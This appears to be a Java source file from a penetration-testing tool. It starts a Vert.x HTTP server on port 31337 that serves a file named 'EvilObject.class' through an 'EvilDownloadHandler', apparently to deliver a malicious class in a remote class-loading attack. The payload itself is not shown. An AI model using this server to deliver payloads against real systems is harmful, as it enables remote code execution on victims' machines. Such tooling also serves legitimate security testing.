package de.marko.pentest;

import de.marko.pentest.rest.handler.EvilDownloadHandler;
import io.vertx.core.AbstractVerticle;
import io.vertx.core.Vertx;
import io.vertx.core.http.HttpServer;
import io.vertx.ext.web.Router;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author marko
 * @version 1.0.0.
 * @date 19.08.2017
 */
public class HttpAPIServer extends AbstractVerticle {

	private final static Logger LOGGER = LoggerFactory.getLogger(HttpAPIServer.class);

	private Vertx vertx;

	private static final int port = 31337;

	private static final HttpAPIServer instance = new HttpAPIServer();

	private HttpAPIServer() {
		this.vertx = Vertx.vertx();

		this.vertx.deployVerticle(this);
	}

	public static HttpAPIServer getInstance() {
		return instance;
	}

	@Override
	public void start() throws Exception {

		// Create Server
		HttpServer server = vertx.createHttpServer();

		// Create Router to handle paths
		Router router = Router.router(this.vertx);

		router.get("/EvilObject.class").handler(new EvilDownloadHandler());

		// Start server and listen to port 31337
		server.requestHandler(router::accept).listen(port, res -> {
			if (res.succeeded()) {
				LOGGER.info("Server is now listening on port:" + port);
			} else {
				LOGGER.info("Failed to bind!");
			}
		});

	}

	@Override
	public void stop() throws Exception {
	}

	public void close() {
		this.vertx.close();
	}

	public Vertx vertx() {
		return this.vertx;
	}


}
